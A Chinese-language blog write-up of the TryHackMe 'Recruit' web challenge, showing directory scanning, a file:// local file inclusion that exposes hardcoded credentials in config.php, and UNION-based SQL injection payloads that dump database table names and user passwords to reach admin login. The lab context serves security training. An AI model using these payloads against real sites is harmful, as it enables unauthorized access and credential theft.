---
title: 'Write-up: Recruit'
tags:
  - TryHackMe
  - Web
categories:
  - 网络安全
date: 2026-07-15 11:16:46
---


## 0x0 前言

Recruit 刚刚推出了新的招聘门户，允许人力资源人员管理候选人申请，让管理员监督招聘决策。虽然该平台看起来功能正常，但管理层怀疑在开发过程中可能忽视了安全性。您的任务是像真正的攻击者一样评估应用程序，映射其结构，滥用公开的功能并利用漏洞。

您能否获得初步立足点、升级访问权限并最终以 **管理员** 身份登录？

房间链接：[Recruit](https://tryhackme.com/room/recruitwebchallenge)

## 0x1 信息搜集

观察目标网站，是一个登陆界面。尝试了一下 SQL 盲注的身份验证绕过，发现并没有什么用。

![](/img/write-up/writeup-recruit-1.png)

查看各页面的源码，发现引用了 `api.php` 和 `file.php` 两个页面。
页面内引用的 `/file.php?cv=URL` 代表可能存在 SSRF 或者 LFI。

![](/img/write-up/writeup-recruit-2.png)

尝试多次不同的 LFI payload 均显示如上提示。
至此没啥线索和思路了，用 feroxbuster 扫一下。

```bash
feroxbuster -u http://IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 70
```

发现存在 `sitemap.xml`。这个文件通常包含了网站各页面的 URL，用于搜索引擎的索引优化。
访问后在文件底部找到了一些提示。

- 一些目录可能存在内部文档或日志
- 特定的端点用于内部 HR 的集成功能
- 对敏感数据的访问是有用户身份限制的

![](/img/write-up/writeup-recruit-3.png)

这里很明显指的目录是 `/mail`，继续扫描 mail 目录，发现存在 `mail/mail.log` 文件。

```bash
feroxbuster -u http://IP/mail -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 70
```

![](/img/write-up/writeup-recruit-4.png)

阅读日志，可知存在用户名 `hr`，和网站的配置文件 `config.php`。

## 0x2 Flag 1

利用 LFI，构造指向服务器本地文件 `config.php` 的 URL，使用 `file://` + 文件相对路径：

`http://IP/file.php?cv=file://config.php`

`file://` 是一个非常经典的 URI，用于访问本地路径的文件。

访问发现直接返回了 `config.php` 的源码。阅读可以发现硬编码了账号 `hr` 的密码。
现在有了 HR 的账号凭证，回到主页登陆，成功在后台获得第一个 flag。

![](/img/write-up/writeup-recruit-5.png)

## 0x3 Flag 2

通过观察后台发现存在一个搜索框，这意味着可能存在 SQL 注入。
引号可以用来干扰 SQL 查询逻辑，输个 `'` 进去康康，很容易的就触发了 SQL 报错，说明确实存在注入。

![](/img/write-up/writeup-recruit-6.png)

我们也可以利用 Flag 1 阶段发现的 LFI，直接查看并审计 `dashboard.php` 的源码，没有任何防护或参数化查询，确认存在 SQL 注入。

![](/img/write-up/writeup-recruit-7.png)

随后使用 UNION 注入来尝试枚举数据库的表结构，并提取数据。通过不断尝试，发现当前表有 4 列。

```sql
' UNION SELECT 1,2,3,4; -- 
```

需要注意的是，注入的 SQL 语句末尾的注释需要留个空格，让 SQL 数据库正确处理注释以忽略后面原有的语句，不然没办法正常注入。

![](/img/write-up/writeup-recruit-8.png)

通过以下 SQL 语句枚举数据库结构并提取数据：

```sql
# 获取数据库名
' UNION SELECT 1,2,3,database(); -- 

# 获取数据库内所有表
' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'recruit_db'; -- 

# 获取表内所有列
' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'; --

# 获取 users 表内账号密码
group_concat(username,':',password SEPARATOR '<br>') FROM users; -- 
```

可以得知：

- 数据库名：`recruit_db`
- 表：`candidates`, `users`
- `users` 表中存在列：`username`, `password`
- 用户账号名和密码

![](/img/write-up/writeup-recruit-9.png)

登出现有账号，使用获取到的管理员凭证登陆，得到第二个 flag。

![](/img/write-up/writeup-recruit-10.png)

## 0x4 结语

做为 Jr Penetration Tester 路线 Web Application Vulnerabilities I 模块的 Ending，这个房间很明显想要考察的是 SSRF 和 SQL 注入。但是其中的“SSRF 元素”实际上更偏向于 LFI。SSRF 和 LFI 的很明显区别是，SSRF 强调“操控服务器访问指定的 **网络资源**”，而 LFI 强调“操控服务器访问指定的本地 **文件资源**”。
LFI 的学习房间实际上位于接下来的 Web Application Vulnerabilities II 模块中，怀疑是否是 TryHackMe 的学习路线设计问题（

另外通过查看 `file.php` 源码，发现这个题目设计以一种比较抽象的方法实现 LFI，要是不参考其他 writeup 或者审计源码，还真想不出来用 `file://` 来访问本地文件（

![](/img/write-up/writeup-recruit-11.png)
